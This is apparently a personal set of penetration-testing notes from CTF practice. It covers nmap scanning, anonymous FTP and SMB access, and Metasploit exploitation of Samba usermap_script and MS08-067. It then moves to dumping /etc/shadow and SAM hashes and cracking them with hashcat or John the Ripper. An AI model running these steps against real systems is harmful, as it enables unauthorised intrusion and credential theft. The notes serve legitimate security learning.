# pentest-notes
notes from ctf challenges
terminal commands start with a #
metasploit commands start with >

scanning process:
# nmap -A -T4 -p- "ip" //or
# nmap -sU -A -T4 -p- "ip" //udp
# nmap -A -T4 -p21, 80, 433 "ip" //specific ports


(does a syn syn ack rst)

finding open ports:

if running smb port 139/445:
# smbclient -L \\ip\ or \\\\ip\\
root password can be anonymous

if port 21 is open: service ftp:
ftp "ip"
un: anonymous
password: anonymous
ls
file can be uploaded in ftp server

look for anonymous ftp login: ok for internal server but bad for external facing servers
some ftp verison are buffer overflow vulnerable

if port 22 is open for ssh:
can be checked for bad passwords with brute force
brute force attacks should be picked up by the siem


if access shows file share list:
# smbclient \\\\ip\\ADMIN$ //etc



if smbclient access failed:
do further enumeration with metasploit

if version smb version already given:
google exploits
# msfconsole
# systemctl postgresql enable
from rapid 7
> use exploit/multi/samba/usermap_script
> options
> set rhosts "ip"
> show targets
> run
> whoami //root highest for linux 
> hostname
> pwd
upadatedb
locate root.txt
cat /etc/passwd // has service account at top and user accounts in botton, password stored in shadow files x
cat /etc/shadow
use unshadow tool
# gedit passwd
# gedit shadow
# unshadow
# unshadow passwd shadow
x in passwd will be replaced by the hash in shadow
crack hash with hashcat




# msfconsole
> search smb_version
> use auxiliary/scanner/smb/smb_version
auxiliary(scanner/smb/smb_version) > options
search for required 'yes' and no current setting enabled

if remote host:
auxiliary(scanner/smb/smb_version) > set rhosts "ip" or "ip/24" (for all machines in network)
rhost should be set to the ip
auxiliary(scanner/smb/smb_version) > run

research info found: for exploits
exploit db or rapid 7

in case windows xp sp3:
auxiliary(scanner/smb/smb_version) > use exploit/windows/smb/ms08_067_netapi
exploit(windows/smb/ms08_067_netapi) > options

exploit(windows/smb/ms08_067_netapi) > set rhosts "ip"
exploit(windows/smb/ms08_067_netapi) > show target

exploit(windows/smb/ms08_067_netapi) > run

"meterpreter session 1 opened" (opened shell, accessed)
reverse shell (creates a listening port), have target connect back (usually internal)
bind shell connecting to the target (usuallyl external)



> getuid
nt authority\system = highest level else use getsystem command to elevate
> sysinfo
architecture should match the meterpreter shell eg x86

> help // to for all commands to do on an accesses machine

> hashdump //dumps sam->storing local user passwords crack hash with john the ripper or hash cat whole hash or part of hash seperated by : using crack map exec, ps exec

> shell (would give similar to windows cmd)
> cd c:\
> C:\>cd "documents and settings" 
> dir
> cd john
> dir
> cd Desktop
> type user.txt
for root text
C:\Documents and Settings>cd adminitrator\desktop
> type root.txt

looking for sensitive files:
meterpreter > pwd
cd c:\\
pwd
c:\
dir
--------------------------------------------------------------------------------------------------------------------------------------------
















